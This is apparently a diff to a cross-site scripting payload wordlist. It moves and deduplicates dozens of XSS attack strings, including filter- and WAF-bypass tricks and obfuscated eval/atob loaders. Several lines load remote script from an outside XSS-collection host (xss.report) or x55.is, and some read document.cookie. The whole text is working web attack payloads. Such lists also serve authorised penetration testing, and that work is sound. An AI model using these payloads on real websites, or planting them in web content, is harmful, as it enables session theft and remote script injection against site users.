@@ -1,3 +1,30 @@
+<<https:http://x55.is/onfocus=1?import(tagName):1 AutoFocus ContentEditable>>
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+'"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
+'"><script src=https://xss.report/c/department></script>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/department\';document.body.appendChild(a)')
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/department&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/department");a.send();</script>
+<script>$.getScript("//xss.report/c/department")</script>
+var a=document.createElement("script");a.src="https://xss.report/c/department";document.body.appendChild(a);
+<Svg OnLoad= location=`Java${/S/.source}cript:alert${"\50"}1)`>
+<Svg OnLoad= location=textContent>JavaS<a>cript:al<a>ert(<a>1)//
+<img src="X" onerror=top[8680439..toString(30)](1337)> 
+<script>top[8680439..toString(30)](1337)</script>
+<input type=hidden oncontentvisibilityautostatechange​=alert() style=content-visibility:auto>
+OnXSS=<Img/Src/OnError=alert(1)>
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto
+<img src=x  oncontentvisibilityautostatechange="confirm(1)">
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+0</option></select><img/src=xon=()onx+honerror=alert(1)>ss<svg/onload =prompt(document.cookie)%20>
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`>
+<img hrEF="0" sRC="data:0," oNLy=1 oNErrOR =console.log`1`>
 ‘>alert(154)</script><script/154=’;;;;;;;
 <ScriPt>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</sCripT>
 <script%20TEST>alert(1)</script%20TESTTEST>
@@ -880,7 +907,6 @@ _0x68087f:alert(0x1);
 %27%3E%27%3E%22%3E%script%3Ealert(2);%3C/script%3E
 %27%3E'><script>alert(2);</script>
 %27x%27onclick=%27alert(1)
-"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 %2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74
 %2F%2F%2A%3E%3CScRipt%3Ealert%28%2FXSS%2F%29%3C%2FScriPT%3E
 "%2F><%2Fscript><script>alert%28document.cookie%29<%2Fscript>
@@ -1657,7 +1683,6 @@ Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7Pg==
 <image id=x tabindex=1 onfocus=alert(1)></image>
 <IMG ���><SCRIPT>alert(�XSS�)</SCRIPT>�>
 "><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
-<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
 <input autofocus onfocus=alert(1)>
 <input autofocus onfocus=alert(1)>	
@@ -2341,7 +2366,6 @@ svg/onload=alert(document.cookie)abcdef@test.com
 <sVg oNloaD=write()>
 "><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
 “><sVg/OnLuFy=”X=y”oNloaD=;1^confirm(1)>/“^1//
-<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")>
 "><Svg Only=1 OnLoad=confirm(document.domain)>
 <sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
@@ -2663,17 +2687,6 @@ zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//
 嘼svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>
 嘼嘾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E
 嘾嘾<script>alert(2);</script>
-<<https:http://x55.is/onfocus=1?import(tagName):1 AutoFocus ContentEditable>>
-'"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
-'"><script src=https://xss.report/c/department></script>
-"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/department\';document.body.appendChild(a)')
-"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
-"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
-"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/department&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/department");a.send();</script>
-<script>$.getScript("//xss.report/c/department")</script>
-var a=document.createElement("script");a.src="https://xss.report/c/department";document.body.appendChild(a);
 <svg onload=onerror=eval,new'\u0022-alert\x281\x29//'>
 <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 <script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>
